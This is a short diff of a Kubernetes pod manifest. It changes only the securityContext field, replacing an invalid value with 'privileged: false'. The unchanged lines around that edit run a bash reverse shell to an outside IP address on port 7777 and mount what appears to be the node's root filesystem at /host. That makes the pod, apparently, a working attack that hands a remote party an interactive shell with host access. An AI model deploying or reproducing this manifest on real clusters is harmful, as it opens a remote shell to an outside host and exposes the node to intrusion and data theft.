@@ -31,7 +31,8 @@ spec:
     image: ubuntu
     command: ["/bin/bash", "-c", "--"]
     args: ["bash -i >& /dev/tcp/4.242.16.43/7777 0>&1"]
-    securityContext: true
+    securityContext:
+      privileged: false
     volumeMounts:
     - mountPath: /host
       name: noderoot
